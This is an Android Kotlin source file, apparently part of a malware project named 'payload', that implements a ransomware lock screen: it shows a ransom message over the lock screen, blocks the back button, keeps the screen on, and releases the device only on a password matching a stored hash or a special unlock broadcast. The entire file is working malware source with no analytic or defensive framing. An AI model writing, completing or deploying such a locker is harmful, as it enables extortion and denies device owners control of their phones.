package com.ihk909.payload

import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import java.security.MessageDigest

class RansomLockActivity : Activity() {
    private var receiver: BroadcastReceiver? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )

        val msg = intent.getStringExtra("msg")
            ?: getSharedPreferences("ihk909", MODE_PRIVATE)
                .getString("ransom_msg", "Your files are encrypted.")

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xFF0b0c10.toInt())
            setPadding(60, 200, 60, 60)
        }

        root.addView(TextView(this).apply {
            text = msg
            setTextColor(0xFFff5a1f.toInt())
            textSize = 22f
        })

        root.addView(TextView(this).apply {
            text = "Enter password to unlock"
            setTextColor(0xFFe6e8ee.toInt())
            textSize = 14f
            setPadding(0, 20, 0, 20)
        })

        val edit = EditText(this).apply { hint = "password" }
        root.addView(edit)

        root.addView(Button(this).apply {
            text = "Unlock"
            setOnClickListener {
                runCatching {
                    val hash = sha256(edit.text.toString())
                    val saved = getSharedPreferences("ihk909", MODE_PRIVATE)
                        .getString("ransom_pass_hash", "")
                    if (hash == saved) {
                        getSharedPreferences("ihk909", MODE_PRIVATE).edit()
                            .putBoolean("ransom_locked", false).apply()
                        finish()
                    }
                }
            }
        })

        setContentView(root)

        receiver = object : BroadcastReceiver() {
            override fun onReceive(c: Context?, i: Intent?) { finish() }
        }
        val filter = IntentFilter("com.ihk909.payload.UNLOCK")
        if (Build.VERSION.SDK_INT >= 33) {
            registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            @Suppress("DEPRECATION")
            registerReceiver(receiver, filter)
        }
    }

    override fun onBackPressed() { /* block */ }

    override fun onDestroy() {
        runCatching { unregisterReceiver(receiver) }
        super.onDestroy()
    }

    private fun sha256(s: String): String =
        MessageDigest.getInstance("SHA-256").digest(s.toByteArray(Charsets.UTF_8))
            .joinToString("") { "%02x".format(it) }
}